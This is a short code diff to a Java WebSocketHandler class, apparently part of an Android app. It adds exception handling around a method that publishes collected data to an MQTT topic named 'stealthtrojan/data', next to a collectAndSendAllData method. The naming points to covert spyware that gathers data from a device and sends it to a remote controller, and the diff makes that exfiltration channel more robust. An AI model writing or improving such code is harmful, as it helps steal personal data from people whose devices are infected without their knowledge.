@@ -45,10 +45,14 @@ public class WebSocketHandler {
     }
 
     public void sendData(String dataType, String data) {
-        String payload = String.format(
-            "{\"type\":\"%s\",\"payload\":\"%s\"}", dataType, data
-        );
-        mqttService.publish("stealthtrojan/data", payload);
+        try {
+            String payload = String.format(
+                "{\"type\":\"%s\",\"payload\":\"%s\"}", dataType, data
+            );
+            mqttService.publish("stealthtrojan/data", payload);
+        } catch (MqttException e) {
+            Log.e(TAG, "Failed to send data: " + dataType, e);
+        }
     }
 
     public void collectAndSendAllData() {
